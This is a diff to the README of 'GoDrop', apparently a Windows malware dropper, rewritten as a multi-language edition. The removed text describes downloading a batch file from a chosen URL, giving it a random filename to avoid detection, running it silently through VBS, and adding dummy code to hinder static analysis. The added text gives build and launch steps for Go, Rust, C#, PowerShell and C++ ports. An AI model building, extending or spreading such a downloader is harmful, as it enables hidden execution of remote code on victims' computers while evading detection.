@@ -1,21 +1,67 @@
-# GoDrop
+# GoDrop Multi-Port Edition
 
-## Setup
-Make sure you change the url on line 61.
+GoDrop now keeps every language in an organized folder under `ports/`, including Go.
 
-## Overview
-This Go program downloads a batch file from a specified URL, saves it to a temporary directory with a random filename, and executes it on a Windows system. The batch file is executed silently using a VBS script. The program includes functions to perform unnecessary calculations, likely for obfuscation purposes.
+## Folder layout
 
-## Features
-- **Random Filename Generation**: Generates a random string for naming the downloaded file to avoid detection.
-- **HTTP File Download**: Retrieves a batch file from a provided URL.
-- **Silent Execution via VBS**: Executes the batch file on Windows using a VBS script for hidden execution.
-- **Platform Check**: Ensures execution only on Windows systems for batch files.
-- **Obfuscation**: Includes dummy functions to perform unnecessary calculations, potentially to complicate static analysis.
+- Go: `ports/go`
+- Rust: `ports/rust`
+- C#: `ports/csharp`
+- PowerShell: `ports/powershell`
+- C++: `ports/cpp`
 
-## Prerequisites
-- **Go**: Install [Go](https://golang.org/dl/) to compile and run the program.
-- **Windows OS**: The program is designed to execute batch files on Windows systems only.
+Each folder includes a `builder.bat` that:
+1. Prompts the user for a direct URL at runtime.
+2. Builds (or prepares) that language variant.
+3. Generates a `run-downloader.bat` launcher in the same folder with the entered URL wired in.
 
-## Build Command
-1. go build -o downloader.exe -ldflags "-H=windowsgui" godrop.go
+## Behavior
+
+All variants download/save `.bat` or `.exe` artifacts and print status output in locale options (`en`, `es`, `fr`).
+
+## Per-language usage
+
+### Go
+```bat
+cd ports\go
+builder.bat
+run-downloader.bat
+```
+
+### Rust
+```bat
+cd ports\rust
+builder.bat
+run-downloader.bat
+```
+
+### C#
+```bat
+cd ports\csharp
+builder.bat
+run-downloader.bat
+```
+
+### PowerShell
+```bat
+cd ports\powershell
+builder.bat
+run-downloader.bat
+```
+
+### C++
+```bat
+cd ports\cpp
+builder.bat
+run-downloader.bat
+```
+
+## Build everything
+
+From `scripts/`:
+
+```bat
+build-all.bat
+```
+
+Artifacts are placed in `dist\`.
